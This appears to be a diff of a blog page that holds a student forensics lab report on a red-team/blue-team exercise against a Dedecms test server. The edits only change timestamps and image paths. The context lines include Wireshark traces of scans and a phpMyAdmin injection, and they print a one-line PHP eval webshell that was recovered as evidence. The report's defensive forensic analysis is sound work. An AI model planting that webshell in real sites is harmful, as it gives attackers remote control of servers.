@@ -10,7 +10,7 @@
 <meta property='og:description' content="电子与信息工程学院 计算机取证技术实训 课程报告 题\u3000目： 计算机取证技术实训\n学\u3000院： 电子与信息工程学院\n专\u3000业： 电子信息工程（信息安全）\n组\u3000号： 第 2 组\n任课教师： 容振邦\n起止日期： 2025 年 10 月 13 日至 2026 年 1 月 2 日\n">
 <meta property='og:url' content='https://charles-lin-cell.github.io/p/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%AE%AD/'>
 <meta property='og:site_name' content='梦幻星河的博客'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-08-03T17:15:50&#43;08:00'/><meta property='article:modified_time' content='2026-08-03T18:36:37&#43;08:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-08-03T17:15:50&#43;08:00'/><meta property='article:modified_time' content='2026-08-07T16:08:34&#43;08:00'/>
 <meta name="twitter:title" content="计算机取证技术实训">
 <meta name="twitter:description" content="电子与信息工程学院 计算机取证技术实训 课程报告 题\u3000目： 计算机取证技术实训\n学\u3000院： 电子与信息工程学院\n专\u3000业： 电子信息工程（信息安全）\n组\u3000号： 第 2 组\n任课教师： 容振邦\n起止日期： 2025 年 10 月 13 日至 2026 年 1 月 2 日\n">
     <link rel="shortcut icon" href="/favicon.ico" />
@@ -388,7 +388,7 @@
 
 
                 <time>
-                    Aug 03, 2026 18:36 &#43;0800
+                    Aug 07, 2026 16:08 &#43;0800
                 </time>
             </div></footer>
 
@@ -490,7 +490,7 @@
 <li>
 <p><strong>虚拟机网络模式配置</strong>：红蓝双方虚拟机均设置为“仅主机模式”，避免外部网络干扰，确保内网互通。<br>
 （Kali 网络适配器配置截图）</p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c1.png"
+<p><img src="/%5c%5cimages%5c1.png"
 	
 	
 	
@@ -499,7 +499,7 @@
 	
 ></p>
 <p>（Windows Server 2019 网络适配器配置截图）</p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c2.png"
+<p><img src="/%5c%5cimages%5c2.png"
 	
 	
 	
@@ -507,7 +507,7 @@
 	
 	
 ></p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c3.png"
+<p><img src="/%5c%5cimages%5c3.png"
 	
 	
 	
@@ -530,7 +530,7 @@
 <li>
 <p><strong>连通性验证</strong>：<br>
 蓝队通过 cmd 执行 <code>ping 172.3.200.20</code>，红队通过终端执行 <code>ping 172.3.200.10</code>，双方均显示 0% 丢包率，确认网络互通。</p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c4.png"
+<p><img src="/%5c%5cimages%5c4.png"
 	
 	
 	
@@ -538,7 +538,7 @@
 	
 	
 ></p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c5.png"
+<p><img src="/%5c%5cimages%5c5.png"
 	
 	
 	
@@ -566,7 +566,7 @@
 筛选 SYN 扫描特征数据包。<br>
 分析结果显示：红队 IP（172.3.200.20）向蓝队 IP（172.3.200.10）的多个端口发送 SYN 请求，其中 80 端口（HTTP 服务）和 21 端口（FTP 服务）返回 SYN-ACK 响应，确认蓝方开放这两个关键服务，与红队扫描结果一致，证明红队实施了端口扫描攻击。<br>
 （蓝队 Wireshark 扫描结果截图）</p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c7.png"
+<p><img src="/%5c%5cimages%5c7.png"
 	
 	
 	
@@ -580,7 +580,7 @@
 筛选 FTP 协议流量。<br>
 分析结果显示：捕获到红队发送的 FTP 登录请求数据包，用户名和密码均为 anonymous，且后续数据包显示 “Login successful” 响应，证明红队通过弱口令爆破成功登录 FTP 服务器。该流量证据直接验证了红队的 FTP 爆破行为。<br>
 （蓝队 Wireshark 捕获结果截图）</p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c9.png"
+<p><img src="/%5c%5cimages%5c9.png"
 	
 	
 	
@@ -594,7 +594,7 @@
 筛选红队的 HTTP GET 请求。<br>
 分析结果显示：红队在短时间内发送大量 GET 请求，尝试访问 /dedecms 目录下的不同路径，其中包含 /dede（Dedecms 后台）、/phpmyadmin（数据库管理页）等敏感路径的访问请求，符合目录扫描的特征，证明红队实施了 Web 目录探测攻击。<br>
 （蓝队捕获 ffuf 目录扫描截图）</p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c13.png"
+<p><img src="/%5c%5cimages%5c13.png"
 	
 	
 	
@@ -607,7 +607,7 @@
 <code>ip.addr == 172.3.200.20 and http.request.method == &quot;POST&quot; and http.host == &quot;172.3.200.10/phpmyadmin&quot;</code><br>
 筛选相关 POST 请求。<br>
 尽管部分流量被 Windows Defender 拦截，但通过威胁历史记录和后续文件验证，结合捕获到的 phpMyAdmin 访问流量，确认红队通过 POST 请求提交了 SQL 注入语句，成功写入恶意文件。在蓝方 web 目录下面成功找到 webshell.php。</p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c15.png"
+<p><img src="/%5c%5cimages%5c15.png"
 	
 	
 	
@@ -615,7 +615,7 @@
 	
 	
 ></p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c16.png"
+<p><img src="/%5c%5cimages%5c16.png"
 	
 	
 	
@@ -629,7 +629,7 @@
 </h3><p>蓝队打开“事件查看器”（win+R 输入 <code>eventvwr.msc</code>），展开“Windows 日志 → 安全”，筛选事件 ID 4624（登录成功事件）。<br>
 分析结果显示：存在来源 IP 为 172.3.200.20（红队）的登录记录，登录类型为 5（网络登录），登录时间与红队 FTP 爆破成功时间一致，由于红队采用匿名登录，用户名字段显示为“暂缺”。该日志证据验证了红队通过网络登录蓝队服务器的行为。<br>
 （事件查看器截图）</p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c17.png"
+<p><img src="/%5c%5cimages%5c17.png"
 	
 	
 	
@@ -652,7 +652,7 @@
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>筛选红队访问记录。</p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c18.png"
+<p><img src="/%5c%5cimages%5c18.png"
 	
 	
 	
@@ -660,7 +660,7 @@
 	
 	
 ></p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c19.png"
+<p><img src="/%5c%5cimages%5c19.png"
 	
 	
 	
@@ -679,7 +679,7 @@
 </h2><p>文件证据是攻击方遗留的直接证据，通过查找恶意文件、验证文件内容和创建时间，可直接证明攻击行为的实施。本次实训的核心文件证据为红队写入的一句话木马文件。</p>
 <h3 id="341-恶意文件查找">3.4.1 恶意文件查找
 </h3><p>蓝队根据流量分析和日志记录，定位 Web 系统根目录 <code>C:\xampp\htdocs\dedecms</code>，在该目录下发现名为 <code>webshell.php</code> 的可疑文件，该文件不在 Dedecms 默认文件列表中，疑似红队攻击遗留文件。</p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c20.png"
+<p><img src="/%5c%5cimages%5c20.png"
 	
 	
 	
@@ -698,7 +698,7 @@
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>确认该文件为一句话木马，攻击者可通过蚁剑等工具连接该文件，获取服务器控制权。</p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c21.png"
+<p><img src="/%5c%5cimages%5c21.png"
 	
 	
 	
@@ -709,7 +709,7 @@
 <h3 id="343-文件属性分析">3.4.3 文件属性分析
 </h3><p>查看 <code>webshell.php</code> 的属性信息：创建时间为 2025 年 12 月 10 日 21:51:17，与红队执行 SQL 写入 Shell 的时间（21:05 左右）高度吻合，时间差源于系统文件创建延迟和防御软件拦截时间。结合文件内容和创建时间，可直接证明该文件为红队攻击过程中写入的恶意文件。
 （文件属性截图）</p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c22.png"
+<p><img src="/%5c%5cimages%5c22.png"
 	
 	
 	
@@ -721,7 +721,7 @@
 </h2><p>IP 溯源通过查询攻击方 IP 地址的相关信息，定位攻击源头，为追踪攻击者提供线索。本次实训中红队使用内网 IP，通过模拟公网 IP 溯源场景完成分析。</p>
 <h3 id="351-公网-ip-获取">3.5.1 公网 IP 获取
 </h3><p>红队将 Kali Linux 虚拟机网络模式改为 NAT 模式，通过终端执行 <code>curl ifconfig.me</code> 命令，获取公网 IP 地址为 <code>119.133.5.47</code>。</p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c23.png"
+<p><img src="/%5c%5cimages%5c23.png"
 	
 	
 	
@@ -731,7 +731,7 @@
 ></p>
 <h3 id="352-威胁情报查询">3.5.2 威胁情报查询
 </h3><p>蓝队访问微步在线威胁情报平台（https://x.threatbook.cn/），输入红队公网 IP <code>119.133.5.47</code> 进行查询，结果如下：</p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c24.png"
+<p><img src="/%5c%5cimages%5c24.png"
 	
 	
 	
@@ -739,7 +739,7 @@
 	
 	
 ></p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c25.png"
+<p><img src="/%5c%5cimages%5c25.png"
 	
 	
 	
@@ -747,7 +747,7 @@
 	
 	
 ></p>
-<p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c26.png"
+<p><img src="/%5c%5cimages%5c26.png"
 	
 	
 	
@@ -935,7 +935,7 @@ IP 溯源借助微步在线等权威威胁情报平台，数据来源可靠、�
 </span></span><span class="line"><span class="cl">    netmask 255.255.0.0
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c27.png"
+</div><p><img src="/%5c%5cimages%5c27.png"
 	
 	
 	
@@ -952,7 +952,7 @@ IP 溯源借助微步在线等权威威胁情报平台，数据来源可靠、�
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php @eval($_POST[&#34;cmd&#34;]);?&gt;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c28.png"
+</div><p><img src="/%5c%5cimages%5c28.png"
 	
 	
 	
@@ -977,7 +977,7 @@ IP 溯源借助微步在线等权威威胁情报平台，数据来源可靠、�
 
 
         <span>
-            最后更新于 Aug 03, 2026 18:36 &#43;0800
+            最后更新于 Aug 07, 2026 16:08 &#43;0800
         </span>
     </section></footer>
 
